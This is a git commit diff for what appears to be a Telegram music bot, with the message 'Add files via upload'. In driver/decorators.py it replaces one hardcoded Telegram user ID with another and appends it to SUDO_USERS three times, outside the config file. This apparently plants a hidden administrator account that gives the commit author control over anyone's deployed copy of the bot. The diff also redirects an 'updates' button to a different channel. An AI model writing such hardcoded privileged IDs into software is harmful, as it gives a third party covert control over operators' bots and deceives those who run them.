006d44e1c5371fafb5c47676bec71be95908fe5d
Music-euro <108573536+Music-euro@users.noreply.github.com>
2022-08-19 21:41:01 +0200

    Add files via upload

--- driver/decorators.py
+++ driver/decorators.py
@@ -5,9 +5,9 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1970797144)
-SUDO_USERS.append(1970797144)
-SUDO_USERS.append(1970797144)
+SUDO_USERS.append(5514915465)
+SUDO_USERS.append(5514915465)
+SUDO_USERS.append(5514915465)
 
 
 def errors(func: Callable) -> Callable:
--- driver/utils.py
+++ driver/utils.py
@@ -18,7 +18,7 @@ keyboard = InlineKeyboardMarkup(
     [
             [
                 InlineKeyboardButton(text="• الـقـائـمـه♪", callback_data="cbmenu"),
-                InlineKeyboardButton("• الـتـحـديـثـات♪",url=f"https://t.me/FA9SH"),
+                InlineKeyboardButton("• الـتـحـديـثـات♪",url=f"https://t.me/source_Telemex"),
             ],
             [
                 InlineKeyboardButton(
